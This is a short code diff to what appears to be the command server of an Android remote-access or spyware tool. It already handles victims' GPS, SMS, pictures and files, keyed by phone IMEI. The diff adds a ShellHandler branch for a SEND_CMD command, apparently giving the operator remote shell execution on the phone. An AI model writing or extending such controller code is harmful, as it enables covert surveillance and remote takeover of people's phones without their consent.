@@ -11,6 +11,7 @@ import handler.FileHandler;
 import handler.FileTreeHandler;
 import handler.GPSHandler;
 import handler.PacketHandler;
+import handler.ShellHandler;
 import handler.PictureHandler;
 import handler.PreferenceHandler;
 import handler.SMSHandler;
@@ -243,6 +244,12 @@ public class Server implements Controler {
 				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
 			channelHandlerMap.get(imei).registerHandler(channel, new PictureHandler(channel, imei, gui));
 			gui.savePictureChannel(imei, channel);
+
+		} else if ((command == Protocol.SEND_CMD)) {
+			if (!channelHandlerMap.get(imei).registerListener(channel, new RawPacket()))
+				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
+			channelHandlerMap.get(imei).registerHandler(channel, new ShellHandler(channel, imei, gui));
+			gui.saveShellChannel(imei, channel);
 			
 		} else if ((command == Protocol.LIST_DIR)) {
 			if (!channelHandlerMap.get(imei).registerListener(channel, new FileTreePacket()))
